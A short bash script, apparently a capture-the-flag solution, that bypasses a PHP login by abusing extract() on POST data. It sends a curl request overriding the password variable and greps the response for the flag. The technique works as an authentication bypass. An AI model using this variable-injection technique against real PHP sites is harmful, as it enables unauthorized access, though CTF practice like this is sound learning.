#!/bin/bash

# Since the page calls the PHP function 'extract' with the passed in POST arguments,
# it sets any variables created in POST to be actual variables in the code. We can use this
# to "set out our own password" and log in with it!

page=`curl "http://ducks.sctf.michaelz.xyz/" --data "thepassword_123=ANYTHING&pass=ANYTHING" 2>/dev/null`
echo $page|grep -o "sctf{.*}"
